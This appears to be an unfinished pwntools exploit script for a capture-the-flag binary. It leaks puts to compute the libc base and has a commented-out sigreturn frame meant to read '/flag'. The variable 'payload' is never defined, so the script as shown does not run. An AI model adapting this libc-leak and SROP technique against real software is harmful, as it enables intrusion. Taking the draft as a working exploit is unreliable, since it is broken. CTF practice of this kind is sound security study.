from pwn import *

io = process('./vn_pwn_babybabypwn_1')
context.log_level = 'debug'
context.arch = 'amd64'

puts_offset = 0x84420
printf_offset = 0x61c90

raw_input()
io.recvuntil(b'Here is my gift:')
puts_addr = io.recvuntil(b'\n',drop = True)
puts_addr = int(puts_addr,16)
libc_base = puts_addr - puts_offset
log.success('libc base: ' + hex(libc_base))
raw_input('>')
libc_base = puts_addr - puts_offset

# fmtstr #sigframe.rdi = b'/flag%6$p' 这一行要报错，自己写payload吧
#sigframe = SigreturnFrame()
#sigframe.rdi = b'/flag%6$p'
#sigframe.rip = libc_base + printf_offset
#payload = b'a' * 0x20 + bytes(sigframe)

stack_addr = libc_base - 0x300

io.recvuntil(b'Please input magic message:')
io.send(payload)

io.interactive()
